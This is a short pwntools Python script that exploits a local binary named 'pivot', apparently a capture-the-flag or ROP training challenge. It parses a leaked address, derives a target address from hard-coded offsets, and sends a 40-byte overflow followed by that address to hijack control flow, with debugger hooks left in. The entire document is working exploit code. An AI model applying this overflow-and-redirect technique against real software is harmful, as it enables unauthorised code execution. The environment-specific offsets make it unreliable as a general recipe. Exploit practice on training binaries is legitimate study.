from pwn import * 
context.log_level="debug"
p=process("./pivot")
p.readuntil("pivot: ")
data=p.readline()
raw_input()
base=int(data[:-1],16)-0x1000000-0x10+0x100+(0x7fa7b33cc000-0x7fa7b2001000)+0xabe
log.warning(hex(base))
p.readuntil("\n> ")
p.sendline(p32(0xdeadbeef))
payload="D"*40+p64(base)
p.readuntil("\n> ")
gdb.attach(p)
p.send(payload.ljust(40,'\0'))

p.interactive()

